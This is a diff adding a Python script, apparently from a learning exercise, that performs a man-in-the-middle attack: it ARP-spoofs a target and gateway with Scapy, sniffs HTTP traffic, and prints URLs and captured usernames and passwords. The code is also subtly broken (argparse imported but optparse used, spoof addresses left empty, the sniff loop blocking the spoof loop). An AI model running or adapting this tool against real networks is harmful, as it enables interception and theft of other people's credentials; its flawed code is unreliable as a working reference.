@@ -1,0 +1,234 @@
+#!/usr/bin/env python
+
+# Python 2.7
+
+# sudo pip install scapy
+# sudo pip install scapy_http
+
+# Open up port forwarding before starting program
+# "echo 1 > /proc/sys/netipv4/ip_forward"
+# Opens up Kali to forward traffic on behalf of target
+
+"""
+==============
+Man In The Middle
+==============
+-----------
+[*] imports
+-----------
+-----------
+:Command Line Arguments:
+-----------
+[f] get_arguments
+	[o] target, gateway, interface
+	[i] Get command line arguments to pass to the program
+		[+] Add options
+		[+] Set error messages
+		[+] Return options
+-----------
+:ARP Spoof:
+-----------
+[f] get_mac
+	[v] ip
+	[i] Obtain MAC address of target by creating an ARP request packet with Scapy
+		[+] Create ARP request packet and set target IP address
+		[+] Set MAC of the broadcast packet to ff:ff:ff:ff:ff:ff
+		[+] Combine ARP request packet with the broadcast
+		[+] Use .srp to receive responses, store in a variable
+		[+] Return variable filtered to the MAC of the target
+-----------
+[f] spoof
+	[v] target_ip, spoof_ip
+	[i] Poison the target's ARP table by flooding ARP packets with spoofed information
+		[+] Pass the get_mac result to a variable
+		[+] Create ARP response packet with the IP/MAC of the target, and IP of the router
+		[+] Send the packet to the target
+-----------
+[f] restore
+	[v] destination_ip, source_ip
+	[i] Restore the ARP table of the target at the end of the spoofing attack
+		[+] Use get_mac to retrieve MACs of the destination and source IPs
+		[+] Create ARP response packet and set destination/source IP/MAC
+		[+] Send packet 4 times
+-----------
+:Packet Sniffer:
+-----------
+[f] sniff
+	[v] interface
+	[i] Use Scapy's "sniff" function to sniff an interface for packets
+		[+] Set interface, memory storage, call-back functions, and initial filters
+-----------
+[f] get_url
+	[v] packet
+	[i] Create a URL string from information in the host/path fields
+		[+] Append the path with the host
+-----------
+[f] get_login_info
+	[v] packet
+	[i] Check packet for potential strings that indicate login info
+		[+] Set packet filters
+-----------
+[f] process_sniffed_packet
+	[v]
+	[i] Post-sniff processing of the packet for filtering/modification
+		[+] Choose packet layer to manipulate
+		[+] Call and process get_url and get_login_info
+-----------
+:Begin Program:
+-----------
+[s] Set target_ip and gateway_ip variables with get_arguments
+[s] Set sent_packets_count variable
+[t] Initialize try block
+	[s] Set boolean while True
+		[c] Call sniff with get_arguments interface
+	[s] Set boolean while True
+		[c] Call spoof on target_ip, gateway_ip
+		[c] Call spoof on gateway_ip, target_ip
+		[+] Increment sent_packets_count by 2
+		[+] Print packets sent statement
+		[+] Flush stdout
+		[+] Set time delay to 2 seconds
+[e] Initialize except block for KeyboardInterrupt
+	[+] Print closing statement
+	[c] Call restore on target_ip, gateway_ip
+	[c] Call restore on gateway_ip, target_ip
+	[+] Print restore statement
+-----------
+==============
+"""
+
+import scapy.all as scapy
+from scapy.layers import http
+import time
+import sys
+import argparse
+
+# -----------
+# :Command Line Arguments:
+# -----------
+
+def get_arguments():
+	parser = optparse.OptionParser()
+	parser.add_option("-t", "--target", dest="target", help="Target IP address")
+	parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP address")
+	parser.add_option("-i", "--interface", dest="interface", help="Interface to be sniffed")
+	(options, arguments) = parser.parse_args()
+	if not options.target:
+		parser.error("[-] Please specify a target, use --help for more info.")
+	elif not options.gateway:
+		parser.error("[-] Please specify a gateway, use --help for more info.")
+	elif not options.interface:
+		parser.error("[-] Please specify an interface, use --help for more info.")
+	return options
+
+# -----------
+# :ARP Spoof:
+# -----------
+
+def get_mac(ip):
+	arp_request = scapy.ARP(pdst=ip)
+	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+	arp_request_broadcast = broadcast/arp_request
+	answered_list = scapy.srp(arp_request_broadcast, timeout=1)[0]
+
+	return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+
+	target_mac = get_mac(target_ip)
+	# op 1  - ARP Request
+	# op 2 	- ARP Response
+	# pdst  - IP of target
+	# hwdst - MAC of target
+	# psrc  - IP of router
+
+	packet = scapy.ARP(op=2, pdst="", hwdst=target_mac, psrc="")
+
+	#To preview packet before continuing
+	#print(packet.show())
+	#print(packet.summary())
+
+	scapy.send(packet, verbose=False)
+
+
+def restore(destination_ip, source_ip):
+	destination_mac = get_mac(destination_ip)
+	source_mac = get_mac(source_ip)
+	# op 1  - ARP Request
+	# op 2 	- ARP Response
+	# pdst  - IP of destination
+	# psrc  - IP of source
+	# hwdst - MAC of destination
+	# hwsrc - MAC of source
+	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+
+	#To preview packet before continuing
+	#print(packet.show())
+	#print(packet.summary())
+
+	scapy.send(packet, count=4, verbose=False)
+
+
+# --------------
+# :Packet Sniff:
+# --------------
+
+def sniff(interface):
+	# iface  - choose interface
+	# store  - decide whether or not to store packets in memory
+	# prn    - specify call-back function
+	# filter - allows us to filter packets using the Berkley Packet Filter (BPF) syntax
+	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+
+
+def get_url(packet):
+	# Narrows in on the location of the URL in the packet and creates a string
+	return packet[http.HTTPRequest].host + packet[http.HTTPRequest].path
+
+
+def get_login_info(packet):
+	if packet.haslayer(scapy.Raw):
+		# Narrows in on the location of login credentials in HTTP post requests
+		load = packet[scapy.Raw].load
+		# Filters for login strings
+		keywords = ["username", "login", "email", "user", "passsword", "pass"]
+		for keyword in keywords:
+			if keyword in load:
+				return load
+				
+
+def process_sniffed_packet(packet):
+	if packet.haslayer(http.HTTPRequest):
+		# print(packet.show())
+		# .show() shows all layers in the packet and the fields that are set
+		# this will help with building this function
+		url = get_url(packet)
+		print("[+] HTTP Request >> " + url)
+
+		login_info = get_login_info(packet)
+		if login_info:
+			print("\n\n[+] Possible username/password > " + login_info + "\n\n")
+
+options = get_arguments()
+
+target_ip = options.target
+gateway_ip = options.gateway
+
+sent_packets_count = 0 
+
+try:
+	while True:
+		sniff(options.interface)
+	while True:
+		spoof(target_ip, gateway_ip)
+		spoof(gateway_ip, target_ip)
+		sent_packets_count += 2
+		print("\r[+] Packets sent: " + str(sent_packets_count)),
+		sys.stdout.flush()
+		time.sleep(2)
+except KeyboardInterrupt:
+	print("[-] Detected CTRL + C ... \n Resetting ARP tables ... \n Stopping packet sniff ... \n Please wait.\n")
+	restore(target_ip, gateway_ip)
+	restore(gateway_ip, target_ip)
+	print("[+] ARP tables restored.")
